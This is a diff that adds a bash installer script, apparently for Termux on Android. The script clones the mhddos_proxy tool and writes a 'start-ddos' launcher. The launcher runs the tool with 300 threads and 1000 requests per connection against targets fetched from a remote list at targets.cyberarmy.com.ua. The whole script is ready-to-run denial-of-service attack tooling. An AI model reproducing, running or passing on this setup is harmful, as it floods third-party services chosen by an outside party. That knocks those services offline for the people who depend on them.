@@ -1,0 +1,28 @@
+#!/bin/bash
+echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mInstalling mhdoos_proxy\033[0;0m\n"
+set -xe
+apt update && apt upgrade -y
+pkg install python3 -y && pkg install rust -y && pkg install git -y
+pip install --upgrade pip
+echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mSettings\033[0;0m\n"
+cd ~
+export CARGO_BUILD_TARGET=aarch64-linux-android
+termux-setup-storage
+pkg install git -y
+cd ~/storage/shared
+rm -rf mhddos_proxy
+echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mClone mhddos_proxy\033[0;0m\n"
+git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
+cd mhddos_proxy
+echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mLoading dependencies\033[0;0m\n"
+pip install -r termux_requirements.txt
+echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mOk Installed\033[0;0m\n"
+set -xe
+cat > start-ddos <<EOF
+#!/usr/bin/env bash
+cd ~/storage/shared/mhddos_proxy
+exec python runner.py -c https://targets.cyberarmy.com.ua/targets.txt -t 300 --rpc 1000 \$@
+EOF
+chmod +x start-ddos
+
+set +xe
